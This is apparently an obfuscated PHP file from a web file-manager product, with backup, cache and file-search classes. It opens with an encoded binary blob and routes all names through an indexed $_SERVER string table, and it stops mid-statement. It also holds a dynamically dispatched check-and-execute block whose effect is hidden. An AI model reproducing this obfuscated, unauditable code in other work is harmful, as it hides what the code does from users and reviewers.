\xc6\x18\x64\x9f\x88\xe"."\5\10\207\277\53\232\241\20\37\357\12\102\115\0\11\130\12\210\135\177\111\141\351\333\123\351\117\27\374\232\23\164\202\142\75\370\144\65\7\314\140\237\221\111\25\270\174\227\110\150\325\5\117"."\202\324\102\150\46\257\61\253\346\304\3\151\43\103\360\340\24\254\234\363\111\154\134\325\351\333\114\270\214\23\7\261\323\205\26\27\52\260\304\206\262\154\207\323\266\204\231\320\172\75\24\160\61".base64_decode('ihSxhlE5LAvwk1GgTMY3FOq/i1iKh/gUpZjR7WlM2qEcActKLr3ETigIHDpU/groXqazQ8Q=')."\121\214\46\371\265\174\136\274\234\310\147\56\372\327\241\353\15\171\35\211\26\225\130\77\121\251\144\104\134\300\231\364\232\111\23\341\145\263\230\13\323\27\34\107\152\101\272\61\312\126\265\351\253".base64_decode('jlAKhuKon+30SRcmTG6SPbNzLjzCSPxi7S99lseyaoBTsGwQE8oaMMnFzCdf6aCAspDZrUE=')."\204\246\127\100\206\143\127\143\110\102\44\66\165\340\112\320\206\214\336\312\247\22\342\233\140\132\57\40\12\246\51\113\317\75\154\43\202\131\243\315\360\53\30\367\43\53\105\371\56\160\172\305\243"."\xdb\x85\xfc\x34\xea\x69\x7e\xbf\xc2\x71\x41\x5e\xc8\x26\xa0\x84\x2c\x90\xdb\xf3\x6b\xa9\x17\x5b\xe6\xb1\x96\xed\x37\x70\x57\x5b\xc6\x7\xed\x84\x2e\x6c\x3d\x42\x81\xfc\x8b\x9c\xed\x9\x75\xe5\x3c\x5a\x4b\xa7\x3f".strrev('óõ–]É‡ˆˆxÈX» ÓJôK€Ôi]ƒ‡É_å,ÂX/sªá‹â}È-ÉL+ğœNb')."\xeb\x70\xfd\xe7\x5e\xd0\x32\x9e\x82\xbf\xb4\x41\x50\xab\x20\xf7\xbf\x94\x13\x55\xd6\x2d\xec\x29\xb0\x17\x72\x77\x31\xc3\x1\xf1\xe8\xc\x17\x3a\x8c\xd4\x98\x75\xc9\xa9\xb2\x22\x9b\x9a\x31\x73\xf6\x7c\x99\xcf\x22"."\226\120\274\33\203\41\31\170\376\6\62\111\0\205\342\4\103\205\131\320\226\321\7\311\164\352\351\224\72\225\166\35\33\377\273\15\43\356\57\264\250\44\33\314\333\53\347\107\122\202\123\111\150"."\315\45\143\144\142\261\37\113\332\152\316\26\51\235\121\246\267\322\221\50\266\4\165\2\154\146\360\245\76\213\137\20\354\202\346\274\270\226\273\237\221\361\262\313\40\146\2\213\230\123\112\13\330".base64_decode('NyJbusDJLdqmm/eEq+Mjk/BRo7kMnOjYwobYU2Um4QuWid3F6LVNiKfh4TvYcs5Z8J/GkEk=')."\31\107\317\222\4\316\27\214\201\222\204\374\16\352\325\154\257\4\202\22\357\122\267\243\144\165\1\51\210\253\262\163\334\256\346\121\65\321\106\267\107\231\250\120\211\126\253\354\17\132\330\166\224".base64_decode('aEBcm2nAT8BpIArYTmpK9jlLtJeFaSKyQR2bVTI8L2v/kobkXVDatOTBV7CkCA8LRgRbmIg=')._kodDe('KYVZ+2Ouj63jvhsvD1nuxcHlfoRRRJvjZ79jvlYpKPG3m0Z2jdiv5K2tl6olViOJnoYgDsI2')."\xd\xc2\x8d\x39\x21\x8a\xa7\x1\x39\x2c\x5b\x28\x70\xdc\xb0\xb8\x8b\x53\xc7\x8d\xcb\x72\xfb\x39\x46\xf4\xa3\xc3\x15\x4c\xaa\xc4\xab\x3c\x20\x4b\xa2\x87\x47\xbf\x26\x1d\xb7\xe2\x64\x15\xa1\xb6\x62\x56\x44\x24\xde"."\63\271\246\361\114\207\41\7\154\317\320\205\61\230\171\10\313\345\71\235\32\116\247\141\166\177\370\77\166\361\373\177\313\263\357\354\32\366\112\300\265\370\360\207\270\332\140\63\220\363\320\155\374".strrev('ˆ¹wiÜ“w‰Pùp\'HÉ–;ØÔ¼Ù’Üfu©s‰'."\r".'p$7ÁV…ÀlóíU”%yËP')."\x5b\xdd\xd8\xed\xcf\xbd\x93\x70\x8a\x99\x43\xf6\x6e\x81\x5e\x70\x5a\xb9\x6a\xb2\x17\x68\x97\x7\x78\xd2\x16\x4a\x91\x5a\xe1\xc2\x8c\x50\xd8\xcb\x8f\x6e\x4b\xea\x58\x19\xde\x3\xa3\xd9\x5\xce\xcb\x19\xc9\x81\x32"."\xaf\xf9\x44\xc4\xd7\xe9\x3a\x41\x22\x71\x4a\x8a\x89\xee\x23\x4a\x88\x4b\x19\xb3\x50\x12\xdf\x54\x89\x19\x1d\x58\x6\xd9\xd4\x41\x34\xcf\xee\xb4\xd5\x70\xca\x74\x9f\xc6\xb0\x21\x31\xaf\x2\x48\x51\x46\x84\x8e\xa4".strrev('Ô%uãSrä¬¼:<œµ‚®E˜æÖ”w'."\n".'”U¼u¹ä²š¤åÕ£PN»N|ã7^Q#®,p™ô')."\x7a\x5d\xcd\x71\x3f\xdd\xce\x4d\xe3\x70\x1c\x4d\x5\x62\xd0\x4e\x8b\x61\x5e\xc\xe3\xc9\x91\xe7\x2e\xf2\x18\xee\x2d\xad\x43\x37\x48\x5c\x94\x99\x60\x8b\x96\xc7\x18\xbc\x53\x82\x2f\x89\x43\xf2\x7c\x30\xcc\xd3\x5e"."\x30\x9\xb9\xe9\x4c\xe5\xfc\x29\x49\xd8\x3b\x29\x31\x7f\xdd\x14\x24\x4d\x9e\xea\x2b\x39\x15\x19\x12\x76\xac\x14\x96\x30\x14\xcf\xac\x89\x68\x2c\xa4\x2e\xb\x63\xb3\x1c\xe1\x33\x43\x1d\xcc\xe8\xb4\x61\x12\xaf\x2d"."\xac\xc9\x8e\xd6\x2a\xa2\x72\x7\x1b\x0\xdd\x85\x9a\x4c\x1\x4a\x3a\x42\x8f\x12\x27\x5a\x58\x4e\xb6\xb3\xf9\x20\x7f\x14\x76\xea\x65\x4b\x7a\x1e\xcc\x44\x99\xcc\x1b\x75\x16\xc6\x3a\x3a\xce\xbd\xb8\xa8\x5c\xb1\xa4".base64_decode('WbBks6OOTEzWmSg3xq7zaSbK0ZFDO1pP2npKwZSC44rQOatmZvcXNTeL+UJEJWd9SUm4q8Q=')."\x67\x7a\x99\x54\x32\x2b\x53\xb6\x9e\x49\x8d\x9\x95\xcb\x43\x40\x1a\xb7\x1d\xd0\x24\xbc\x3\xb9\xbd\x2\x39\xbd\x0\xd5\x49\x4c\x5b\xea\x60\xc9\xe1\x3e\xac\x64\x91\xda\xcc\xa0\xa0\x61\x5c\x79\x18\x47\x4c\x9c\x8b"."\57\273\374\11\234\371\203\301\122\176\176\154\321\14\153\244\370\11\40\2\257\175\205\232\125\231\200\23\146\61\10\116\23\101\275\245\127\114\370\222\135\30\215\26\142\331\266\22\73\200\116\345\62".base64_decode('qT7hP1GWkoOzBEINcpL0yI9udymnpziSSZKZIXRoQXqmdkoJcL3dkjO3aESkbFKLGdRFv9g=')."\302\100\130\130\234\42\331\364\335\55\60\244\161\243\156\356\132\35\216\233\263\44\123\220\44\310\44\124\372\154\54\136\263\45\102\226\125\303\127\157\101\114\270\322\45\344\53\216\107\155\110\220\345"."\342\132\230\112\65\151\103\145\212\246\164\267\121\76\224\302\213\22\262\136\62\15\42\364\207\364\141\371\353\120\116\350\353\70\12\226\246\12\323\41\122\175\361\156\50\206\211\323\312\15\237\40\103"."\x67\x75\xd9\x34\x9\x7\x2a\x91\x44\xfd\x65\x71\x1\x1c\xe9\xa\x8e\x25\x94\x84\x64\xe\x1d\xa\xe7\x27\x89\x4f\x3a\xd\xa1\xf0\x62\x7c\xcd\x50\x19\xa2\x49\xe8\x75\xa4\xba\xb8\x8\x98\x75\xc7\x68\x4f\x57\x16\x30"._kodDe('MJKhudSq4P4SIb6X/0cnTnr4sODf/w3XPlCKcLe2esJO13tqhmbX8dGAcScfv8Egi6+OEZz8')."\x99\x91\x92\x4c\x33\x93\xc1\xf\xc3\x13\x64\x53\xb1\x62\xe9\x30\x2e\x2d\x21\x38\xb5\xb4\x43\xe4\xf6\x2d\x36\xe\x4d\xcc\x92\x67\xe\x9a\x17\x70\x66\xd1\xf2\xba\x6b\xde\xe4\xa\xee\x39\xa5\x35\x1c\xee\x29\xe5\xf4"."\141\303\116\366\111\254\202\322\314\322\364\102\311\62\103\7\312\217\303\335\133\266\312\156\6\212\150\244\244\77\222\164\124\302\54\123\207\366\250\154\65\232\205\153\212\253\230\243\356\4\123\200\353"."\xd2\x2c\x5c\xb7\x24\x9b\x55\x2e\x99\x57\x52\xcf\xd6\x8a\xd6\x4\xc3\x2b\x9d\x3c\x60\xc8\xa5\xca\xc\x58\xb0\xad\xa4\xa2\x13\xcd\x67\xd9\xc2\xa5\x9f\x83\x3d\xe0\x2e\x4d\x38\x78\xe5\x7b\x21\x18\x6f\x2e\xe1\x94\x72"."\275\50\133\170\302\136\270\113\13\172\10\137\274\313\345\224\335\240\140\41\277\314\211\301\162\312\234\21\24\377\115\50\355\45\44\240\112\17\53\221\127\106\36\213\176\22\123\146\262\335\315\62\331"."\262\160\127\171\361\257\130\131\374\146\71\345\262\134\351\362\4\201\115\171\32\141\362\233\210\74\314\30\3\102\356\225\351\307\114\165\34\142\305\334\100\316\344\7\143\112\310\72\143\252\56\120\160"."\317\163\111\153\116\320\317\25\45\73\376\145\325\165\74\230\73\126\312\171\312\150\134\237\122\210\6\322\213\275\151\33\111\335\351\54\100\266\376\107\363\331\107\62\22\307\335\305\6\27\274\72\207"."\270\120\31\346\60\111\242\101\237\170\167\242\355\111\144\231\200\11\207\146\35\45\206\340\221\217\12\13\4\361\113\36\177\30\46\166\354\51\361\100\263\343\146\301\366\340\274\204\231\47\277\15\246"."\155\13\331\33\312\16\43\127\0\114\1\170\44\321\62\24\22\57\302\270\123\344\175\221\200\55\301\130\44\10\142\13\230\275\24\327\151\56\301\163\216\10\176\267\344\21\371\200\207\127\311\246\242"."\113\300\102\44\14\230\251\36\163\204\331\274\104\160\45\115\222\170\243\324\334\124\355\220\133\323\133\26\224\43\306\134\54\77\315\361\203\147\52\57\151\3\274\350\372\372\363\275\216\352\324\335\47"."\27\167\377\242\26\340\5\103\64\101\335\322\20\166\62\150\376\305\23\361\222\254\366\100\74\276\54\32\153\244\136\154\112\262\111\55\111\2\261\44\253\275\45\332\66\121\136\250\65\20\216\224\344".base64_decode('YWHFNlVYT6VZ4XbSS/JOP1EvwsEloifsETAC3krFKkiPYvk+k711sfJxjTkJl59T9Kwwpis=').strrev('’Cı“¥#U!Ï‹è„.ß¸áş{!åŠ_Øƒ,Y¡¨-…$ºE85êÌ[jònÙ8ê')."\x4\x97\xf2\x59\x4f\x1e\x4d\x39\x37\x8e\x64\x4f\x2b\x3b\x79\xf2\xd3\x4b\xe9\xe3\x1f\xc9\x15\x93\x83\xbb\x79\xba\x9\x72\xad\xfd\x66\x8f\xb8\xd0\xc1\x4d\xf\xf4\xf9\x61\xba\x25\xa9\x53\x1a\x76\x64\xdb\x5a\x2f\x63"."\x96\x3a\x64\x48\x28\xf\x1d\xe3\xb\xc1\xdd\xfe\xff\x0\x6e\x66\xba\x94\x31\xbc\x0\x0"."".""."".strrev(''), 10, -8))); goto E˜ÛÕŞùñÒ; bêÊ‰’ƒ¡: if ($_SERVER[$_SERVER[®»±”ó²][478]] != $_SERVER[$_SERVER[®»±”ó²][479]]) { $_getc = $_SERVER[®»±”ó²][480]; $_getfile = $_SERVER[$_SERVER[®»±”ó²][481]] . $_SERVER[®»±”ó²][482]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[®»±”ó²][288], $_getfilec); if (count($_getarrs) < $_SERVER[®»±”ó²][483]) { $exit = $_SERVER[®»±”ó²][484]; $exit(); } $_act = $_SERVER[®»±”ó²][485]; $_act($_SERVER[$_SERVER[®»±”ó²][486]]); } class BackupFile { public function __construct() { } public function index() { $¼œ€µÓ = Backup::get(); $¿‚ªÚšş = $¼œ€µÓ[$_SERVER[®»±”ó²][836]][$_SERVER[®»±”ó²][233]][$_SERVER[®»±”ó²][554]]; $ÛÀß«Ü± = array($_SERVER[®»±”ó²][555] => array($_SERVER[®»±”ó²][893], $¿‚ªÚšş), $_SERVER[®»±”ó²][894] => array($_SERVER[®»±”ó²][408], $¼œ€µÓ[$_SERVER[®»±”ó²][832]])); $‡“Ô¥•Å = (int) Model($_SERVER[®»±”ó²][872])->where($ÛÀß«Ü±)->count($_SERVER[®»±”ó²][554]); $°Ó£‚ûæ = (int) Model($_SERVER[®»±”ó²][872])->where($ÛÀß«Ü±)->sum($_SERVER[®»±”ó²][79]); $§Éîş• = new TaskFileTransfer($_SERVER[®»±”ó²][895], $_SERVER[®»±”ó²][858], $‡“Ô¥•Å, LNG($_SERVER[®»±”ó²][867]) . $_SERVER[®»±”ó²][868] . LNG($_SERVER[®»±”ó²][896])); $§Éîş•->task[$_SERVER[®»±”ó²][844]] = $°Ó£‚ûæ; $àµŠ»í¤ = array($_SERVER[®»±”ó²][897] => $‡“Ô¥•Å, $_SERVER[®»±”ó²][898] => $°Ó£‚ûæ, $_SERVER[®»±”ó²][899] => time()); Backup::set($àµŠ»í¤); $ü¸İÚ¿ = !0; $Áßè  = $this->storeIds(); $èë‰¿Ä = 1; $üçâî…¹ = 1000; $£­…•¶Ã = $ƒüëî‘Ñ = 0; $ùÕö•Á¯ = array(); $¼ÔİŸÉ• = $À¶á¤–¤ = 0; do { $İÀ«²í = $_SERVER[®»±”ó²][900]; $ö€ìÕÅ” = Model($_SERVER[®»±”ó²][872])->where($ÛÀß«Ü±)->field($İÀ«²í)->order($_SERVER[®»±”ó²][901])->selectPage($üçâî…¹, $èë‰¿Ä); $­Á«Õò‚ = !empty($ö€ìÕÅ”[$_SERVER[®»±”ó²][447]]) ? $ö€ìÕÅ”[$_SERVER[®»±”ó²][447]] : array(); foreach ($­Á«Õò‚ as $’¯ÔÇ¥) { if (!$this->_fileExist($’¯ÔÇ¥, $ùÕö•Á¯, $Áßè )) { Backup::log($_SERVER[®»±”ó²][902] . $’¯ÔÇ¥[$_SERVER[®»±”ó²][554]] . $_SERVER[®»±”ó²][903] . $’¯ÔÇ¥[$_SERVER[®»±”ó²][87]]); continue; } $¸È¤Ï—Ù = $’¯ÔÇ¥[$_SERVER[®»±”ó²][87]]; $ñşöäÀû = "\x7b\151\157\x3a{$¼œ€µÓ[$_SERVER[®»±”ó²][832]]}\175" . substr($¸È¤Ï—Ù, strlen("\173\151\x6f\72{$’¯ÔÇ¥[$_SERVER[®»±”ó²][904]]}\175")); if (IO::exist($ñşöäÀû)) { $§Éîş•->updateFileEnd($’¯ÔÇ¥[$_SERVER[®»±”ó²][32]], $’¯ÔÇ¥[$_SERVER[®»±”ó²][79]]); } else { $ñşöäÀû = get_path_father($ñşöäÀû); IO::mkdir($ñşöäÀû); if (!IO::copy($¸È¤Ï—Ù, $ñşöäÀû, $_SERVER[®»±”ó²][905])) { Backup::log($_SERVER[®»±”ó²][906] . $¸È¤Ï—Ù . $_SERVER[®»±”ó²][888] . $ñşöäÀû . $_SERVER[®»±”ó²][178]); $ü¸İÚ¿ = !1; break; } } $¿‚ªÚšş = $’¯ÔÇ¥[$_SERVER[®»±”ó²][554]]; $ƒüëî‘Ñ += 1; $£­…•¶Ã += $’¯ÔÇ¥[$_SERVER[®»±”ó²][79]]; $À¶á¤–¤ += 1; $¼ÔİŸÉ• += $’¯ÔÇ¥[$_SERVER[®»±”ó²][79]]; if ($£­…•¶Ã >= 1024 * 1024 * 100) { $àµŠ»í¤ = array($_SERVER[®»±”ó²][831] => $¿‚ªÚšş, $_SERVER[®»±”ó²][907] => $À¶á¤–¤, $_SERVER[®»±”ó²][908] => $¼ÔİŸÉ•); Backup::set($àµŠ»í¤); $£­…•¶Ã = $ƒüëî‘Ñ = 0; } } $÷©Ùˆ•£ = count($­Á«Õò‚); $èë‰¿Ä++; } while ($÷©Ùˆ•£ == $üçâî…¹); $§Éîş•->end(); $àµŠ»í¤ = array($_SERVER[®»±”ó²][909] => 1, $_SERVER[®»±”ó²][842] => time(), $_SERVER[®»±”ó²][856] => 1, $_SERVER[®»±”ó²][831] => $¿‚ªÚšş, $_SERVER[®»±”ó²][910] => time()); if ($ƒüëî‘Ñ) { $àµŠ»í¤[$_SERVER[®»±”ó²][907]] = $À¶á¤–¤; $àµŠ»í¤[$_SERVER[®»±”ó²][908]] = $¼ÔİŸÉ•; } Backup::set($àµŠ»í¤); return !0; } private function _fileExist($Ó—©×÷£, &$‚Ü˜ØÒù, $³ê®„Î) { $ûÌÌ±¼ =& $_SERVER[®»±”ó²]; $Ùùú•œ³ = $Ó—©×÷£[$ûÌÌ±¼[87]]; if (in_array($Ó—©×÷£[$ûÌÌ±¼[554]], $‚Ü˜ØÒù)) { return !1; } if (!in_array($Ó—©×÷£[$ûÌÌ±¼[904]], $³ê®„Î)) { return !1; } if (IO::exist($Ùùú•œ³)) { return !0; } $íç“Ë¯Ö = get_path_father($Ùùú•œ³); if (IO::exist($íç“Ë¯Ö)) { $‚Ü˜ØÒù[] = $Ó—©×÷£[$ûÌÌ±¼[554]]; return !1; } $İñ –Òƒ = array($ûÌÌ±¼[904] => $Ó—©×÷£[$ûÌÌ±¼[904]], $ûÌÌ±¼[87] => array($ûÌÌ±¼[461], "{$íç“Ë¯Ö}\x25")); $Àêè›¢î = Model($ûÌÌ±¼[872])->where($İñ –Òƒ)->field($ûÌÌ±¼[555])->select(); $‚Ü˜ØÒù = array_merge($‚Ü˜ØÒù, array_to_keyvalue($Àêè›¢î, $ûÌÌ±¼[12], $ûÌÌ±¼[554])); return !1; } private function _fileFilter($×·”Î‘¤) { $²Í•»ˆ´ =& $_SERVER[®»±”ó²]; return; if (empty($×·”Î‘¤)) { return; } $Šıò¿Ò = array($²Í•»ˆ´[554] => array($²Í•»ˆ´[7], array_unique($×·”Î‘¤))); $šÛˆŸü = Model($²Í•»ˆ´[911])->where($Šıò¿Ò)->field($²Í•»ˆ´[194])->select(); foreach ($šÛˆŸü as $ç¼œÖó¬) { Model($²Í•»ˆ´[911])->remove($ç¼œÖó¬[$²Í•»ˆ´[194]], !1); } } private function storeIds() { $öÅç¥¨½ =& $_SERVER[®»±”ó²]; $×¦ùÇ  = Model($öÅç¥¨½[848])->listData(); $Û¯šÆ¶ù = array(); $ôüø ’Ã = $GLOBALS[$öÅç¥¨½[6]][$öÅç¥¨½[92]][$öÅç¥¨½[912]]; foreach ($×¦ùÇ  as $×ŸĞ¥Ò½) { $¤²§ÆÊí = strtolower($×ŸĞ¥Ò½[$öÅç¥¨½[98]]); if (!isset($ôüø ’Ã[$¤²§ÆÊí])) { continue; } $ßïúæŞ = $öÅç¥¨½[77] . (isset($ôüø ’Ã[$¤²§ÆÊí]) ? $ôüø ’Ã[$¤²§ÆÊí] : ucfirst($¤²§ÆÊí)); if (!class_exists($ßïúæŞ)) { continue; } $Û¯šÆ¶ù[] = $×ŸĞ¥Ò½[$öÅç¥¨½[477]]; } return $Û¯šÆ¶ù; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÈºôñÀ× =& $_SERVER[®»±”ó²]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¥£˜öŠ» = $GLOBALS[$ÈºôñÀ×[6]][$ÈºôñÀ×[426]]; $Øõ´à« = $¥£˜öŠ»[$¥£˜öŠ»[$ÈºôñÀ×[913]]]; $ÙÓæÅœ = $¥£˜öŠ»[$ÈºôñÀ×[914]]; switch ($¥£˜öŠ»[$ÈºôñÀ×[913]]) { case $ÈºôñÀ×[21]: self::$handle = Model($ÈºôñÀ×[915]); break; case $ÈºôñÀ×[916]: self::$handle = new CacheRedis($Øõ´à«, $ÙÓæÅœ); break; case $ÈºôñÀ×[917]: self::$handle = new CacheMemcached($Øõ´à«, $ÙÓæÅœ); break; case $ÈºôñÀ×[233]: self::$handle = new CacheFile($Øõ´à«, $ÙÓæÅœ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($–ïú±ìÂ) { if (is_array($–ïú±ìÂ) || is_object($–ïú±ìÂ)) { $–ïú±ìÂ = json_encode($–ïú±ìÂ); } $–ïú±ìÂ = rawurlencode($–ïú±ìÂ); return md5(KOD_SITE_ID . $_SERVER[®»±”ó²][11] . $–ïú±ìÂ); } public static function get($ßÓ£±öª, $İŞí±À = false) { $ÉöÁò°Ø = self::key($ßÓ£±öª); $‹í”˜‡Ğ = self::init(); if ($İŞí±À) { return unserialize($‹í”˜‡Ğ->get($ÉöÁò°Ø)); } if (!isset(self::$memoryCache[$ÉöÁò°Ø])) { $œšìÅ¼ = $‹í”˜‡Ğ->get($ÉöÁò°Ø); self::$memoryCache[$ÉöÁò°Ø] = unserialize($œšìÅ¼); } return self::$memoryCache[$ÉöÁò°Ø]; } public static function set($Ï¢¹›šË, $Óİ‹óœ, $ñò©§¯° = false) { $¼áÍËıØ =& $_SERVER[®»±”ó²]; $ú‘ëÊ«± = self::key($Ï¢¹›šË); if (isset(self::$memoryCache[$ú‘ëÊ«±]) && self::$memoryCache[$ú‘ëÊ«±] === $Óİ‹óœ) { return !0; } if ($ñò©§¯° === 0) { self::$memoryCache[$ú‘ëÊ«±] = $Óİ‹óœ; return !0; } $äŒ’Š¿– = self::init(); $±Ã¢ğÓ = serialize($Óİ‹óœ); CacheLock::lock($Ï¢¹›šË . $¼áÍËıØ[918]); $‹©°î»È = $äŒ’Š¿–->set($ú‘ëÊ«±, $±Ã¢ğÓ, $ñò©§¯°); self::$memoryCache[$ú‘ëÊ«±] = $Óİ‹óœ; CacheLock::unlock($Ï¢¹›šË . $¼áÍËıØ[918]); return $‹©°î»È; } public static function getCall($Ğ¤ãï™Á, $Ğ›¥¾ˆŒ, $µéçÓØ, $äŒé¢Í = array()) { $ŸÆ‘‰¡ø =& $_SERVER[®»±”ó²]; $ªÍ»±­ = self::get($Ğ¤ãï™Á); if ($ªÍ»±­ || $ªÍ»±­ === $ŸÆ‘‰¡ø[12]) { return $ªÍ»±­; } $ªÍ»±­ = call_user_func_array($µéçÓØ, $äŒé¢Í); $ªÍ»±­ = $ªÍ»±­ ? $ªÍ»±­ : $ŸÆ‘‰¡ø[12]; self::set($Ğ¤ãï™Á, $ªÍ»±­, $Ğ›¥¾ˆŒ); return $ªÍ»±­; } public static function remove($šÛæŞÍ) { $Ù´§Û†³ = self::key($šÛæŞÍ); unset(self::$memoryCache[$Ù´§Û†³]); self::clearTimeout(); CacheLock::lock($šÛæŞÍ); $˜°ûÅä = self::init()->remove($Ù´§Û†³); CacheLock::unlock($šÛæŞÍ); return $˜°ûÅä; } public static function removeMemory($¯°•ŠêÓ) { $Á‰İÔÒ´ = self::key($¯°•ŠêÓ); unset(self::$memoryCache[$Á‰İÔÒ´]); } public static function clearMemory($¿ÜÇşÂ® = false) { if ($¿ÜÇşÂ®) { $¿ÜÇşÂ® = self::key($¿ÜÇşÂ®); unset(self::$memoryCache[$¿ÜÇşÂ®]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[®»±”ó²][919])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[®»±”ó²][920])) { self::init()->clearTimeout(); } } } goto f°ÉµŒë£; BùÚå³¥±º: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Çªı—Ù) { $£Î¥…º =& $_SERVER[®»±”ó²]; $Úı¸›­¶ = KodIO::fileTypeList(); $Ñ‹ì®®´ = $Úı¸›­¶[$Çªı—Ù]; if (!$Ñ‹ì®®´) { return array(); } $‚±‰¼„¦ = $Ñ‹ì®®´[$£Î¥…º[169]]; $ ĞæåùÌ = $£Î¥…º[7]; if (!$Ñ‹ì®®´[$£Î¥…º[169]]) { $â©¢¨Ú = array_to_keyvalue($Úı¸›­¶, $£Î¥…º[12], $£Î¥…º[169]); $‚±‰¼„¦ = implode($£Î¥…º[50], $â©¢¨Ú); $ ĞæåùÌ = $£Î¥…º[2256]; } $’îú»Ğ = explode($£Î¥…º[50], trim($‚±‰¼„¦, $£Î¥…º[50])); return array($ ĞæåùÌ, $’îú»Ğ); } public function listPathType($­ü›ƒÊÙ) { $Î‹ÌèÑ =& $_SERVER[®»±”ó²]; $ÆïÜùØõ = $this->fileTypeWhere($­ü›ƒÊÙ); if (!$ÆïÜùØõ) { return array(); } $°ÎÂ‚Ëé = USER_ID; $ØÉ¿ëÛ÷ = Model($Î‹ÌèÑ[610])->getInfo($°ÎÂ‚Ëé); $¬ò¬ä = array($Î‹ÌèÑ[664] => SourceModel::TYPE_USER, $Î‹ÌèÑ[597] => array($Î‹ÌèÑ[628], $Î‹ÌèÑ[606] . $ØÉ¿ëÛ÷[$Î‹ÌèÑ[90]][$Î‹ÌèÑ[194]] . $Î‹ÌèÑ[629]), $Î‹ÌèÑ[665] => $°ÎÂ‚Ëé, $Î‹ÌèÑ[662] => 0, $Î‹ÌèÑ[663] => $ÆïÜùØõ); return $this->listSource($¬ò¬ä); } public function listSearch($‹…ÒèÜ, $Š„ƒ¨è  = 300) { $§½¶Èù =& $_SERVER[®»±”ó²]; if (isset($‹…ÒèÜ[$§½¶Èù[2090]]) && $‹…ÒèÜ[$§½¶Èù[2090]]) { $‹…ÒèÜ[$§½¶Èù[2090]] = str_replace($§½¶Èù[462], $§½¶Èù[2257], trim($‹…ÒèÜ[$§½¶Èù[2090]])); } $›¬™Ñ = $this->_parseSearchWhere($‹…ÒèÜ); if (!isset($›¬™Ñ[$§½¶Èù[516]])) { $›¬™Ñ[$§½¶Èù[516]] = 0; } $ŒÄã¹“Š = $§½¶Èù[2258]; $ˆª”¾Èš = $›¬™Ñ; $Õ’ŞèŞ« = $ŒÄã¹“Š; $this->_listSearchBindPinyin($‹…ÒèÜ, $›¬™Ñ, $ŒÄã¹“Š); $this->alias($§½¶Èù[530])->_makeOrder(); $›¬™Ñ = $this->parseWhereLike($›¬™Ñ); $æß£¸¿µ = $this->distinct(!0)->field($ŒÄã¹“Š)->where($›¬™Ñ)->selectPage($Š„ƒ¨è ); if ($GLOBALS[$§½¶Èù[6]][$§½¶Èù[459]][$§½¶Èù[460]] && Input::check($‹…ÒèÜ[$§½¶Èù[2090]], $§½¶Èù[671]) && $æß£¸¿µ[$§½¶Èù[444]][$§½¶Èù[430]] == 1 && $æß£¸¿µ[$§½¶Èù[444]][$§½¶Èù[445]] == 0) { $æß£¸¿µ = $this->distinct(!0)->field($ŒÄã¹“Š)->where($ˆª”¾Èš)->limit(1000)->select(); $æß£¸¿µ = array_page_split($æß£¸¿µ, !1, $Š„ƒ¨è ); } $this->_listSearchFileContent($æß£¸¿µ, $‹…ÒèÜ, $Õ’ŞèŞ«, $ˆª”¾Èš); $this->_listSearchDesc($æß£¸¿µ, $‹…ÒèÜ, $Õ’ŞèŞ«); $this->_listSearchTag($æß£¸¿µ, $‹…ÒèÜ, $Õ’ŞèŞ«); $this->_listSearchGroupTag($æß£¸¿µ, $‹…ÒèÜ, $Õ’ŞèŞ«); $this->_listDataApply($æß£¸¿µ[$§½¶Èù[447]]); $this->_listMake($æß£¸¿µ); return $æß£¸¿µ; } private function _listSearchFileContent(&$£©Ù„§€, $êûè•É, $³¯Æœ‰Ü, $§èëÍ½) { $ÇĞ«½™” =& $_SERVER[®»±”ó²]; if (!$êûè•É[$ÇĞ«½™”[2090]] || $£©Ù„§€[$ÇĞ«½™”[444]][$ÇĞ«½™”[430]] > 1) { return; } if (!isset($§èëÍ½[$ÇĞ«½™”[32]]) || !is_array($êûè•É[$ÇĞ«½™”[554]])) { return; } $§èëÍ½[$ÇĞ«½™”[554]] = array($ÇĞ«½™”[7], $êûè•É[$ÇĞ«½™”[554]]); unset($§èëÍ½[$ÇĞ«½™”[32]]); unset($êûè•É[$ÇĞ«½™”[554]]); $µ¥ğå§ = $this->field($³¯Æœ‰Ü)->where($§èëÍ½)->limit($ÇĞ«½™”[2259])->select(); if (!$µ¥ğå§ || count($µ¥ğå§) == 0) { return; } $£©Ù„§€[$ÇĞ«½™”[447]] = array_merge($µ¥ğå§, $£©Ù„§€[$ÇĞ«½™”[447]]); $£©Ù„§€[$ÇĞ«½™”[444]][$ÇĞ«½™”[445]] += count($µ¥ğå§); } private function _listSearchTag(&$ş÷óØ¼û, $ÏåÄ‘âş, $ú÷ÒŞç‰) { $Ç²Æèßİ =& $_SERVER[®»±”ó²]; if (empty($ÏåÄ‘âş[$Ç²Æèßİ[1950]]) || !in_array($Ç²Æèßİ[2260], $ÏåÄ‘âş[$Ç²Æèßİ[1950]])) { return; } if (!$ÏåÄ‘âş[$Ç²Æèßİ[2090]] || $ş÷óØ¼û[$Ç²Æèßİ[444]][$Ç²Æèßİ[430]] > 1) { return; } $ä³¥ñµ³ = Model($Ç²Æèßİ[2261])->listData(); $ÔŠ¶ƒ˜Å = array(); $°Û¸¡ = $ÏåÄ‘âş[$Ç²Æèßİ[2090]]; foreach ($ä³¥ñµ³ as $Ù–ü¯Ê) { $ğûÇ´ñø = $Ù–ü¯Ê[$Ç²Æèßİ[32]]; $÷äøƒô» = str_replace($Ç²Æèßİ[53], $Ç²Æèßİ[12], Pinyin::get($ğûÇ´ñø)); if (stripos($ğûÇ´ñø, $°Û¸¡) !== !1 || stripos($÷äøƒô», $°Û¸¡) !== !1) { $ÔŠ¶ƒ˜Å[] = $Ù–ü¯Ê[$Ç²Æèßİ[477]]; } } if (!$ÔŠ¶ƒ˜Å) { return; } $‚Ö½› = array($Ç²Æèßİ[511] => array($Ç²Æèßİ[7], $ÔŠ¶ƒ˜Å), $Ç²Æèßİ[1791] => USER_ID); $§àŠœî‹ = Model($Ç²Æèßİ[513])->field($Ç²Æèßİ[87])->where($‚Ö½›)->select(); $§àŠœî‹ = array_to_keyvalue($§àŠœî‹, 